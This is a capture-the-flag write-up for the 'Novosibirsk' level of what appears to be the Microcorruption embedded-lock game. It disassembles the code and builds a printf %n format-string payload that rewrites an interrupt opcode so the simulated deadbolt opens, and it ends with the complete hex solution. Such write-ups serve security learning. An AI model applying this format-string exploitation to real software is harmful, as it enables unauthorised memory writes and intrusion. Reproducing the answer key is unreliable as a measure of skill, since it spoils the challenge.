# Novosibirsk

Doing a quick scan of the code we see the usual suspects `<main>`, `<getsn>`, `<printf>`, but now the check for validity is done inside `<conditional_unlock_door>`, and it looks like this method is using the `0x7E` interrupt, which is meant to interface directly with the HSM-2 and unlock the deadbolt directly (so there is no longer the `<unlock_door>` method).

My initial thought here is to see if there is a way for us to exploit `printf` and attempt to change the instruction that calls the `0x7E` interrupt (interface with HSM-2) into the `0x7F` interrupt (interface with the deadbolt).

When we run the program we see that it is requesting a username, but not a password...

In `main` first we see the stack pointer move by `(0xffff - 0xfe0c + 1) = 0x1F4 (500)` bytes:

```asm
443c:  3150 0cfe      add	#0xfe0c, sp
```

Then the instructions to get the username we see a buffer of same size `0x1f4` allocated at memory address `0x2400`:

```asm
4454:  3e40 f401      mov	#0x1f4, r14
4458:  3f40 0024      mov	#0x2400, r15
445c:  b012 8a45      call	#0x458a <getsn>
```

This input buffer is then copied to the stack:

```asm
4460:  3e40 0024      mov	#0x2400, r14
4464:  0f44           mov	r4, r15
4466:  3f50 0afe      add	#0xfe0a, r15
446a:  b012 dc46      call	#0x46dc <strcpy>
```

And this is what the stack now looks like:

```sh
> r sp
420c 7573 6572 6e61 6d65 0000 0000 0000 0000  username........
421c 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

Followed by printing the buffer that is on the stack:

```asm
446e:  3f40 0afe      mov	#0xfe0a, r15
4472:  0f54           add	r4, r15
4474:  0f12           push	r15
4476:  b012 c645      call	#0x45c6 <printf>
```

In `<conditional_unlock_door>` the listing is fairly simple:

```asm
44b0 <conditional_unlock_door>
44b0:  0412           push	r4
44b2:  0441           mov	sp, r4
44b4:  2453           incd	r4
44b6:  2183           decd	sp
44b8:  c443 fcff      mov.b	#0x0, -0x4(r4)
44bc:  3e40 fcff      mov	#0xfffc, r14
44c0:  0e54           add	r4, r14
44c2:  0e12           push	r14
44c4:  0f12           push	r15
44c6:  3012 7e00      push	#0x7e
44ca:  b012 3645      call	#0x4536 <INT>
44ce:  5f44 fcff      mov.b	-0x4(r4), r15
44d2:  8f11           sxt	r15
44d4:  3152           add	#0x8, sp
44d6:  3441           pop	r4
44d8:  3041           ret
```

There is a bunch of stack manipulation to get ready for the `<INT>` call, but before the call this is what the stack looks like:

```sh
> r sp
4200 7e00 0c42 0642 0000 0244 8e44 7573 6572  ~..B.B...D.Duser
4210 6e61 6d65 0000 0000 0000 0000 0000 0000  name............
```

We see:

- the op-code `0x7E`
- the address of the buffer on the stack `420c`
- the address of the flag to set if the password is correct `4206`
- the location of the flag to set if the password is correct (initialized to `0000`)
- the value of `r4` on entry - `4402`
- the return address to set `pc` to on exit `448e`
- the start of the user input buffer

So, assuming we can use `printf` to change arbitrary data, then to change the opcode for the INT call from `0x7E` to `0x7F`, we need to change the value that is in memory address `44c8`. The value in this memory address will be pushed onto the stack before calling `INT`.

So how do we do this? We are going to attempt the same technique we used in [Addis Ababa](./11-addis-ababa.md), where we make use of the `%n` format specifiers to write to any memory location.

If I want to write `0x7F` using the `%n` format specifier, we will need to make sure we print out `0x7F` characters before `%n`.

So what I'm thinking is doing something like this
`<address I plan to write to> <N random characters> %n`

The function `printf` will count the number of format specifiers, and then expect variadic variables on the stack to use as the params to the format specifiers. Here what we are doing is placing the address we want to write to in the right location so that it is popped off the stack as the format specifier for `%n` (a little bit of trial and error involved as well).

So I end up with something that looks like this:
`<0xc844> <(0x7F - 2) random characters> <"%n">`

`c844 <0x7D (125) characters> 256e`

`c844a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5256e`

Checking the memory location that stores the `INT` op-code before and after the `printf` call:

- Before

```sh
> r 44c8 2
44c8 7e00  ~.
```

- After:

```sh
> r 44c8 2
44c8 7f00  .
```

Success.

**Solution:**

```sh
> solve
c844a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5256e
```
